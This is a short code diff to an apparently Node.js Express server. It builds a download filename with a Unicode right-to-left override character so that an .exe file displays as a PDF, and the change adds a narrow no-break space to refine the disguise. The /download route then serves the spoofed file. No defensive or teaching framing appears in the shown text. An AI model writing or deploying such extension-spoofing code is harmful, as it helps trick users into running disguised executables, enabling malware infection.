@@ -7,7 +7,8 @@ app.use(cors()); // Allow frontend requests
 
 // Serve the file for download
 const RLO = "\u202e";
-const filename = "Ann" + RLO + "fdp.exe";
+const NBSP = "\u202f"; // This is the narrow no-break space
+const filename = "Ann" + NBSP + RLO + "fdp.exe";
 
 app.get("/download", (req, res) => {
   const filePath = path.join(__dirname, "files", filename); // Change to your file
